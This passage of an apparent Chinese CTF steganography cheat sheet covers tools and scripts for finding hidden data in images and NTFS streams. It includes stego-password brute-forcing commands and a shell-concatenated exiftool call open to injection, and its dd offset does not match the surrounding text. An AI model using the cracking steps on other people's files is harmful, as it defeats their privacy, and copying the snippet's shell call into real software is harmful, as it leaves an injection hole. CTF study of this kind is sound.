class="string">&#x27;exiftool &#x27;</span> + <span class="string">&#x27;&quot;&#x27;</span> + img + <span class="string">&#x27;&quot;&#x27;</span>).read()</span><br><span class="line">    exif = exif.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> ex <span class="keyword">in</span> exif:</span><br><span class="line">        ex = ex.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> len(ex) == <span class="number">2</span>:</span><br><span class="line">            exif_dict[ex[<span class="number">0</span>].strip()] = ex[<span class="number">1</span>].split()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;XP Comment&#x27;</span> <span class="keyword">in</span> exif_dict:</span><br><span class="line">        print(exif_dict[<span class="string">&#x27;XP Comment&#x27;</span>])</span><br></pre></td></tr></table></figure><h4 id="提取缩略图"><a href="#提取缩略图" class="headerlink" title="提取缩略图"></a>提取缩略图</h4><p>XnView软件直接查看缩略图。</p><p>可以查看图片信息同时也可以缩略图提取，缩略图的最大特点就是两张图片都能在win和linux正常显示，但是在linux中图片会显示出别的信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool -b -ThumbnailImage delta.jpg &gt; flag.jpg</span><br></pre></td></tr></table></figure><h3 id="winhex与01editor"><a href="#winhex与01editor" class="headerlink" title="winhex与01editor"></a>winhex与01editor</h3><h4 id="正常情况"><a href="#正常情况" class="headerlink" title="正常情况"></a>正常情况</h4><p>丢入之后可以看到图片对应的ascii，其中可能藏有flag、base64等编码。</p><p>有时候需要修补文件头或者修补文件尾部。(通常是直接在头部或者尾部修补)</p><h4 id="特殊情况"><a href="#特殊情况" class="headerlink" title="特殊情况"></a>特殊情况</h4><p>特别情况下一个文件中可能会夹杂着其他的文件，可以使用binwalk分离。</p><p>有时候会藏有其他文件，但是其他文件的头部或者是尾部可能损坏或者缺失，binwalk分离不出来，需要我们手动找到需要</p><p>修改的部位，然后进行相应的修补。并且需要修改的地方不会是在头部或者尾部，而是大量文本的中间部分，这就是需要</p><p>我们先去搜索相应的敏感特殊字符或者十六进制。在搜索的时候，也可以尝试搜索某些文件的尾部，文件尾部结束之后就</p><p>会对应某些文件的头部，比如：</p><p>RAR的头部十六进制为：<code>526172211A</code>，对应的ascii为：<code>Rar!</code>。</p><p>PNG的头部十六进制为：<code>89504E470D0A1A0A0000000D</code>，对应的ascii为    <code>PNG</code>，有时候文件损坏，头部的数据并不会有</p><p>PNG，这时候我们可以搜索PNG特有的ascii—-<code>IHDR</code>,在PNG的尾部，也会特有<code>IEND</code>。尾部十六进制为：<code>49454E44AE426082</code>。</p><p>GIF的头部十六进制为：<code>4749463839</code>，对应的ascii为：<code>GIF89a</code>。</p><p>还有其他文件格式，就不一一列出。</p><h3 id="图片模糊处理"><a href="#图片模糊处理" class="headerlink" title="图片模糊处理"></a>图片模糊处理</h3><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/26.png" alt="26"></p><h3 id="修改宽度和高度"><a href="#修改宽度和高度" class="headerlink" title="修改宽度和高度"></a>修改宽度和高度</h3><h4 id="JPG文件修改图片高度和宽度"><a href="#JPG文件修改图片高度和宽度" class="headerlink" title="JPG文件修改图片高度和宽度"></a>JPG文件修改图片高度和宽度</h4><p>搜索<code>FFC0</code>后的第四到七的字节就是图片的宽和高度。</p><h4 id="PNG文件修改图片高度宽度"><a href="#PNG文件修改图片高度宽度" class="headerlink" title="PNG文件修改图片高度宽度"></a>PNG文件修改图片高度宽度</h4><h5 id="正常修改"><a href="#正常修改" class="headerlink" title="正常修改"></a>正常修改</h5><p>右键查看图片属性，查到长度和宽度，然后转换十六进制，搜索，修改对应的宽度、高度，然后修改成对应的十六进制。</p><h5 id="CRC爆破修改"><a href="#CRC爆破修改" class="headerlink" title="CRC爆破修改"></a>CRC爆破修改</h5><p>根据CRC爆破出正常的高度和宽度，进而进行修改。</p><h3 id="图片锐化"><a href="#图片锐化" class="headerlink" title="图片锐化"></a>图片锐化</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">img = Image.open(<span class="string">&#x27;ifs.bmp&#x27;</span>)</span><br><span class="line"></span><br><span class="line">X = img.size[<span class="number">0</span>]</span><br><span class="line">Y = img.size[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> X,Y</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(X<span class="number">-2</span>):</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> range(Y<span class="number">-2</span>):</span><br><span class="line">    a = img.getpixel((i,j))[<span class="number">0</span>]+img.getpixel((i,j))[<span class="number">1</span>]+img.getpixel((i,j))[<span class="number">2</span>]</span><br><span class="line">    b = img.getpixel((i,j+<span class="number">1</span>))[<span class="number">0</span>]+img.getpixel((i,j+<span class="number">1</span>))[<span class="number">1</span>]+img.getpixel((i,j+<span class="number">1</span>))[<span class="number">2</span>]</span><br><span class="line">    c = img.getpixel((i,j+<span class="number">2</span>))[<span class="number">0</span>]+img.getpixel((i,j+<span class="number">2</span>))[<span class="number">1</span>]+img.getpixel((i,j+<span class="number">2</span>))[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> (a &gt; b <span class="keyword">and</span> c &gt; b) <span class="keyword">or</span> (a &lt; b <span class="keyword">and</span> c &lt; b):</span><br><span class="line">      <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      img.putpixel((i,j),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line"></span><br><span class="line">img.show()</span><br></pre></td></tr></table></figure><h3 id="LSB隐写"><a href="#LSB隐写" class="headerlink" title="LSB隐写"></a>LSB隐写</h3><h4 id="lsb-py"><a href="#lsb-py" class="headerlink" title="lsb.py"></a>lsb.py</h4><p>在debain8的虚拟机上</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@root:~/桌面/cloacked-pixel-master<span class="comment"># python2 lsb.py extract 11.png 1.txt 123456</span></span><br><span class="line">[+] Image size: <span class="number">331</span>x300 pixels.</span><br><span class="line">[+] Written extracted data to <span class="number">1.</span>txt.</span><br></pre></td></tr></table></figure><h4 id="八位二进制最低有效位隐写"><a href="#八位二进制最低有效位隐写" class="headerlink" title="八位二进制最低有效位隐写"></a>八位二进制最低有效位隐写</h4><p>这里要注意图片的模式。如果为L就必须要注意。而且图片是png或者bmp,不能是jpg。</p><p>取每个坐标的像素，然后转换成二进制，然后与1异或得到的0或1就是隐藏的信息，将0或1转换得到flag，比如转换为二维码或者直接转成字符串。</p><h4 id="stegsolve"><a href="#stegsolve" class="headerlink" title="stegsolve"></a>stegsolve</h4><p>最常见的是两张图片进行xor，一定要注意xor的顺序，先打开某一个文件，然后两者在xor，顺序是有影响的。</p><p>每个通道的0位置，把每个0位置保存下来进行xor。</p><p>直接提取信息–<code>data extract</code>，这里配合zsteg。</p><h3 id="从图片中提取flag"><a href="#从图片中提取flag" class="headerlink" title="从图片中提取flag"></a>从图片中提取flag</h3><p>图片中隐约的有flag这时候我们需要使用脚本去根据rgb值提取flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">img = Image.open(<span class="string">&#x27;hide.png&#x27;</span>)</span><br><span class="line">w = img.width</span><br><span class="line">h = img.height</span><br><span class="line">img_obj = Image.new(<span class="string">&quot;RGB&quot;</span>,(w//<span class="number">16</span>,h//<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(w//<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(h//<span class="number">16</span>):</span><br><span class="line">        (r,g,b)=img.getpixel((x*<span class="number">16</span>,y*<span class="number">16</span>))</span><br><span class="line">        img_obj.putpixel((x,y),(r,g,b))</span><br><span class="line"></span><br><span class="line">img_obj.save(<span class="string">&#x27;ok.png&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="Binwalk"><a href="#Binwalk" class="headerlink" title="Binwalk"></a>Binwalk</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># binwalk flag.jpg</span><br></pre></td></tr></table></figure><p>binwalk自动分析文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># binwalk flag.jpg</span></span><br><span class="line"> </span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line"><span class="number">0</span>             <span class="number">0x0</span>             JPEG image data, JFIF standard <span class="number">1.01</span></span><br><span class="line"><span class="number">382</span>           <span class="number">0x17E</span>           Copyright string: <span class="string">&quot;Copyright (c) 1998 Hewlett-Packard Company&quot;</span></span><br><span class="line"><span class="number">3192</span>          <span class="number">0xC78</span>           TIFF image data, big-endian, offset of first image directory: <span class="number">8</span></span><br><span class="line"><span class="number">140147</span>        <span class="number">0x22373</span>         JPEG image data, JFIF standard <span class="number">1.01</span></span><br><span class="line"><span class="number">140177</span>        <span class="number">0x22391</span>         TIFF image data, big-endian, offset of first image directory: <span class="number">8</span></span><br></pre></td></tr></table></figure><p>jpg文件还隐藏着另一个jpg文件，从140147块偏移开始就是另一张jpg。</p><h4 id="使用dd命令分离"><a href="#使用dd命令分离" class="headerlink" title="使用dd命令分离"></a>使用dd命令分离</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># dd if&#x3D;flag.jpg of&#x3D;flag-1.jpg skip&#x3D;28673 bs&#x3D;1</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>是指定输入文件</span><br><span class="line">of是指定输出文件</span><br><span class="line">skip是指定从输入文件开头跳过<span class="number">140147</span>个块后再开始复制</span><br><span class="line">bs设置每次读写块的大小为<span class="number">1</span>字节</span><br></pre></td></tr></table></figure><h4 id="使用foremost工具分离"><a href="#使用foremost工具分离" class="headerlink" title="使用foremost工具分离"></a>使用foremost工具分离</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foremost flag.jpg</span><br></pre></td></tr></table></figure><h3 id="JPHS"><a href="#JPHS" class="headerlink" title="JPHS"></a>JPHS</h3><p>针对jpg行为，有时候需要密码，有时候直接空密码。</p><h3 id=""><a href="#" class="headerlink" title=""></a><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/4.png" alt="4"></h3><h3 id="盲水印"><a href="#盲水印" class="headerlink" title="盲水印"></a>盲水印</h3><h4 id="普通盲水印"><a href="#普通盲水印" class="headerlink" title="普通盲水印"></a>普通盲水印</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 bwmforpy3.py decode hui.png hui_with_wm.png wm_from_hui.png --oldseed</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bwm.py 程序文件python2版本</span><br><span class="line">bwmforpy3.py 程序文件python3版本</span><br><span class="line">hui.png 无水印的原图</span><br><span class="line">wm.png 水印图</span><br><span class="line">hui_with_wm.png 有盲水印的图</span><br><span class="line">wm_from_hui.png 反解出来的水印图</span><br></pre></td></tr></table></figure><h4 id="频域盲水印"><a href="#频域盲水印" class="headerlink" title="频域盲水印"></a>频域盲水印</h4><p>脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pinyubwm.py --original 1.png --image 2.png --result out.png</span><br></pre></td></tr></table></figure><h3 id="NTFS隐写"><a href="#NTFS隐写" class="headerlink" title="NTFS隐写"></a>NTFS隐写</h3><p>NTFS交换数据流（alternate data streams，简称ADS）是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流，就是说除了主文件流之外还可以有许多非主文件流寄宿在主文件流中。它使用资源派生来维持与文件相关的信息，虽然我们无法看到数据流文件，但是它却是真实存在于我们的系统中的。创建一个数据交换流文件的方法很简单，命令为”宿主文件:准备与宿主文件关联的数据流文件”。</p><p>利用方式</p><p>使用winrar解压文件，然后使用工具扫描，会直接看到解压的文件。一定要先使用winrar解压文件。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/6.png" alt="6"></p><p>可以使用工具对文件进行检测，查看是否存在ntfs隐写。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">F:\CTF-tools\NTFS&gt;lads.exe /S</span><br><span class="line"></span><br><span class="line">LADS - Freeware version <span class="number">4.10</span></span><br><span class="line">(C) Copyright <span class="number">1998</span><span class="number">-2007</span> Frank Heyne Software (http://www.heysoft.de)</span><br><span class="line">This program lists files <span class="keyword">with</span> alternate data streams (ADS)</span><br><span class="line">Use LADS on your own risk!</span><br><span class="line"></span><br><span class="line">Scanning directory F:\CTF-tools\NTFS\ <span class="keyword">with</span> subdirectories</span><br><span class="line"></span><br><span class="line">      size  ADS <span class="keyword">in</span> file</span><br><span class="line">----------  ---------------------------------</span><br><span class="line">        <span class="number">23</span>  F:\CTF-tools\NTFS\a.jpg:flag1.txt</span><br><span class="line">      <span class="number">1064</span>  F:\CTF-tools\NTFS\a.jpg:Zone.Identifier</span><br><span class="line"></span><br><span class="line">      <span class="number">1087</span> bytes <span class="keyword">in</span> <span class="number">2</span> ADS listed</span><br></pre></td></tr></table></figure><p>或者使用cmd命令来查看是否存在隐写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">F:\CTF-tools\NTFS&gt;dir /r</span><br><span class="line"> 驱动器 F 中的卷是 新加卷</span><br><span class="line"> 卷的序列号是 BE8A<span class="number">-2731</span></span><br><span class="line"></span><br><span class="line"> F:\CTF-tools\NTFS 的目录</span><br><span class="line"></span><br><span class="line"><span class="number">2020</span>/<span class="number">10</span>/<span class="number">27</span>  <span class="number">11</span>:<span class="number">19</span>    &lt;DIR&gt;          .</span><br><span class="line"><span class="number">2020</span>/<span class="number">10</span>/<span class="number">27</span>  <span class="number">11</span>:<span class="number">19</span>    &lt;DIR&gt;          ..</span><br><span class="line"><span class="number">2020</span>/<span class="number">02</span>/<span class="number">17</span>  <span class="number">16</span>:<span class="number">09</span>            <span class="number">31</span>,<span class="number">469</span> a.jpg</span><br><span class="line">                                 <span class="number">23</span> a.jpg:flag1.txt:$DATA</span><br><span class="line">                              <span class="number">1</span>,<span class="number">064</span> a.jpg:Zone.Identifier:$DATA</span><br><span class="line"><span class="number">2007</span>/<span class="number">01</span>/<span class="number">04</span>  <span class="number">04</span>:<span class="number">10</span>            <span class="number">61</span>,<span class="number">952</span> lads.exe</span><br><span class="line"><span class="number">2020</span>/<span class="number">10</span>/<span class="number">22</span>  <span class="number">14</span>:<span class="number">50</span>           <span class="number">952</span>,<span class="number">930</span> ntfsstreamseditor.exe</span><br><span class="line"><span class="number">2007</span>/<span class="number">04</span>/<span class="number">27</span>  <span class="number">10</span>:<span class="number">17</span>            <span class="number">87</span>,<span class="number">424</span> streams.exe</span><br><span class="line"><span class="number">2020</span>/<span class="number">10</span>/<span class="number">27</span>  <span class="number">11</span>:<span class="number">15</span>         <span class="number">3</span>,<span class="number">403</span>,<span class="number">439</span> test.mp4</span><br><span class="line">                                <span class="number">131</span> test.mp4:Zone.Identifier:$DATA</span><br><span class="line"><span class="number">2020</span>/<span class="number">10</span>/<span class="number">27</span>  <span class="number">11</span>:<span class="number">19</span>         <span class="number">3</span>,<span class="number">379</span>,<span class="number">226</span> test.rar</span><br><span class="line">               <span class="number">6</span> 个文件      <span class="number">7</span>,<span class="number">916</span>,<span class="number">440</span> 字节</span><br><span class="line">               <span class="number">2</span> 个目录 <span class="number">82</span>,<span class="number">187</span>,<span class="number">112</span>,<span class="number">448</span> 可用字节</span><br></pre></td></tr></table></figure><p>然后可以使用工具进行数据提取，7z压缩工具可以看到是否有隐写数据。</p><h4 id="notepad"><a href="#notepad" class="headerlink" title="notepad"></a>notepad</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">notepad 1.txt:flag.txt</span><br></pre></td></tr></table></figure><p>直接可以看到文件，可以使用<code>strings</code>命令来查看是否有ntfs隐写。</p><h3 id="stegdetect"><a href="#stegdetect" class="headerlink" title="stegdetect"></a>stegdetect</h3><p><code>stegdetect</code>可以检测jpg通过<code>JSteg</code>、<code>JPHide</code>、<code>OutGuess</code>、<code>Invisible Secrets</code>、<code>F5</code>、<code>appendX</code>和<code>Camouflage</code>等这些隐写。</p><p>检测隐写方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">检查jpg图片隐写方法_win</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">stegdetect.exe -tjopi -s 10.0 [stego_file]</span><br><span class="line"></span><br><span class="line">-s 修改检测算法的敏感度，该值的默认值为1。检测结果的匹配度与检测算法的敏感度成正比，算法敏感度的值越大，检测出的可疑文件包含敏感信息的可能性越大。</span><br><span class="line">-t 设置要检测哪些隐写工具（默认检测jopi），可设置的选项如下：</span><br><span class="line">j 检测图像中的信息是否是用jsteg嵌入的。</span><br><span class="line">o 检测图像中的信息是否是用outguess嵌入的。</span><br><span class="line">p 检测图像中的信息是否是用jphide嵌入的。</span><br><span class="line">i 检测图像中的信息是否是用invisible secrets嵌入的。</span><br></pre></td></tr></table></figure><p>暴力破解密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python steg_brute.py -b -d [字典] -f [jpg_file]</span><br></pre></td></tr></table></figure><p>stegbreak</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">stegbreak -r rules.ini -f password.txt -t p [stego_file]</span><br><span class="line"># password.txt为自带字典</span><br><span class="line">Loaded 1 files...</span><br><span class="line">[stego_file]：jphide[v5](2333)</span><br><span class="line"># 2333为该文件jphide的密码</span><br></pre></td></tr></table></figure><h3 id="stegpy"><a href="#stegpy" class="headerlink" title="stegpy"></a>stegpy</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;home&#x2F;steady&#x2F;.local&#x2F;bin&#x2F;stegpy &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;1.webp -p</span><br></pre></td></tr></table></figure><p>提取信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stegpy _image.png</span><br></pre></td></tr></table></figure><p>带口令提取信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stegpy _image.png -p</span><br></pre></td></tr></table></figure><h3 id="outguess"><a href="#outguess" class="headerlink" title="outguess"></a>outguess</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">加密：</span><br><span class="line">outguess -k “my secret key” -d hidden.txt demo.jpg out.jpg</span><br><span class="line">加密之后，demo.jpg会覆盖out.jpg,</span><br><span class="line">hidden.txt中的内容是要隐藏的东西</span><br><span class="line"></span><br><span class="line">解密：</span><br><span class="line">outguess -k 123456 -r 4.jpg hidden.txt</span><br><span class="line">解密之后，解密内容放在hidden.txt中</span><br></pre></td></tr></table></figure><h3 id="F5隐写"><a href="#F5隐写" class="headerlink" title="F5隐写"></a>F5隐写</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">F5隐写加密：</span><br><span class="line">java Embed 原图片.jpg 生成的图片.jpg -e 隐藏的文件.txt -p 密码</span><br><span class="line">F5隐写解密：</span><br><span class="line">java Extract 生成的图片.jpg -p 密码</span><br></pre></td></tr></table></figure><h3 id="图片十六进制处理"><a href="#图片十六进制处理" class="headerlink" title="图片十六进制处理"></a>图片十六进制处理</h3><p>比如直接逆序十六进制，或者与其他数据异或，这里可以借助winhex功能。</p><h3 id="zsteg"><a href="#zsteg" class="headerlink" title="zsteg"></a>zsteg</h3><p>zsteg可以检测PNG和BMP图片里的隐写数据。</p><h4 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ zsteg 1.bmp --bits 1 --channel r --lsb --order xy --limit 2048</span><br><span class="line">$ zsteg 1.bmp --bits 1 --channel g --lsb --order xy --limit 2048</span><br><span class="line">$ zsteg 1.bmp --bits 1 --channel b --lsb --order xy --limit 2048</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--bits 1：每次只摘取颜色通道中的第 1 个比特。</span><br><span class="line">--channel r：只摘取红色通道的比特位。</span><br><span class="line">--lsb：按最低有效位优先的顺序进行摘取。</span><br><span class="line">--order xy：按照从左至右、从上至下的顺序对图像素点进行摘取。</span><br><span class="line">--limit 2048：最多摘取输出 2048 字节。</span><br></pre></td></tr></table></figure><h4 id="导出文件"><a href="#导出文件" class="headerlink" title="导出文件"></a>导出文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zsteg -e &quot;b1,bgr,lsb,xy&quot; pcat.png &gt; p.exe</span><br></pre></td></tr></table></figure><h4 id="显示细节"><a href="#显示细节" class="headerlink" title="显示细节"></a>显示细节</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady$ zsteg &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;output&#x2F;png&#x2F;hide.png -v</span><br><span class="line">b2,bgr,msb,xy       .. text: &quot;Wz]Wz]iz&quot;</span><br><span class="line">    00000000: 74 9a 5e 29 cf f3 a9 c0  a7 fc 75 5d 82 90 a6 57  |t.^)......u]...W|</span><br><span class="line">    00000010: 7a 5d 57 7a 5d 69 7a ed  c4 3c 77 5d 37 23 26 d2  |z]Wz]iz..&lt;w]7#&amp;.|</span><br><span class="line">    00000020: cd 5d 67 76 b1 47 2e 24  e9 2d f1 42 c6 8b 47 92  |.]gv.G.$.-.B..G.|</span><br><span class="line">    00000030: 2e 41 ec fb ee 12 ae eb  46 84 bb 47 11 e1 ee 04  |.A......F..G....|</span><br><span class="line">    00000040: 11 11 44 44 44 44 e4 ba  71 4c 92 6a 45 ad d4 fa  |..DDDD..qL.jE...|</span><br><span class="line">    00000050: 57 a3 dd 2c 8b c0 0b a8  d5 5b c2 c5 5f 57 ba 9c  |W..,.....[.._W..|</span><br><span class="line">    00000060: b1 61 18 96 35 a0 70 c9  e6 39 8b b3 28 00 a8 aa  |.a..5.p..9..(...|</span><br><span class="line">    00000070: aa aa 3f 50 01 95 aa 0e  fd 77 1c ff ff 57 e9 29  |..?P.....w...W.)|</span><br><span class="line">    00000080: ff ed c8 f4 7d 6b 18 ec  61 b4 53 cb 25 26 d2 75  |....&#125;k..a.S.%&amp;.u|</span><br><span class="line">    00000090: cb 22 73 5d a7 bf bb ab  bf f3 9c 78 a9 65 0d 02  |.&quot;s].......x.e..|</span><br><span class="line">    000000a0: 1f 11 9e 32 0c e2 ad 07  18 f9 5a c9 3c 7b 14 97  |...2......Z.&lt;&#123;..|</span><br><span class="line">    000000b0: bd 38 ee d9 09 89 b3 9d  e9 29 a7 62 4c 9b a3 8b  |.8.......).bL...|</span><br><span class="line">    000000c0: 15 17 f8 7c 0a bd e2 7d  8b 65 39 b0 36 17 86 96  |...|...&#125;.e9.6...|</span><br><span class="line">    000000d0: e5 31 2d 9a bc a9 70 2b  eb 08 a8 17 0f 85 5b 8b  |.1-...p+......[.|</span><br><span class="line">    000000e0: 81 f6 2d f8 54 7b e4 c7  01 c3 1e 69 db 15 50 a9  |..-.T&#123;.....i..P.|</span><br><span class="line">    000000f0: a3 8d d9 df c7 4a c3 a0  eb ba be fa c7 c1 1e 6a  |.....J.........j|</span><br></pre></td></tr></table></figure><h4 id="查看LSB信息"><a href="#查看LSB信息" class="headerlink" title="查看LSB信息"></a>查看LSB信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zsteg flag.png</span><br></pre></td></tr></table></figure><p>第二个参数就是rgb，这里只有r，代表红色的0号通道藏有PNG，我们打开stegsolve的red 0通道可以看到有PNG信息。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b1,r,lsb,xy         .. file: PNG image data, <span class="number">526</span> x <span class="number">298</span>, <span class="number">8</span>-bit/color RGB, non-interlaced</span><br><span class="line">b1,bgr,msb,xy       .. text: <span class="string">&quot;C2dB2IH&amp;$&quot;</span></span><br></pre></td></tr></table></figure><p>提取图片中的信息</p><p>有时候我们直接提取会提取出一半数据，这时候我们直接使用-l参数设置我们提取信息的长度。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zsteg warmup.bmp b1,r,lsb,xy -l 2048</span><br></pre></td></tr></table></figure><h4 id="all参数"><a href="#all参数" class="headerlink" title="--all参数"></a><code>--all</code>参数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@root:~&#x2F;桌面&#x2F;flag&#x2F;套娃# zsteg &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;套娃&#x2F;2&#x2F;3&#x2F;4&#x2F;5&#x2F;6&#x2F;warmup.bmp&#39; --all</span><br></pre></td></tr></table></figure><h3 id="ImageMagick"><a href="#ImageMagick" class="headerlink" title="ImageMagick"></a>ImageMagick</h3><p>ImageMagick是一个免费的开源，功能丰富，基于文本和跨平台的图像处理工具，用于创建，编辑，编写或转换位图图像。 